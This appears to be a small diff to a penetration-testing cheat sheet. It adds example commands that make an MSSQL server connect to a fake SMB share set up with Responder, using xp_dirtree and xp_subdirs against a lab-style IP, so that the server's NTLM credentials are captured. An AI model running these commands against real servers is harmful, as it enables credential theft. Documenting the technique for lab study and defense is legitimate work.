@@ -33,9 +33,11 @@ We can first use responder to create a fake SMB server, then have mssql verify i
 ```
 sudo responder -I <interface>
 EXEC master..xp_dirtree '\\<ip>\<sharename>\'
+Example: EXEC master..xp_dirtree '\\10.10.16.112\share'
 GO
 #Alternative
-EXEC master..xp_subdirs '\\<ip>\<share>\'
+EXEC master..xp_subdirs '\\<ip>\<sharename>\'
+Example: EXEC master..xp_subdirs '\\10.10.16.112\share'
 ```
 
 
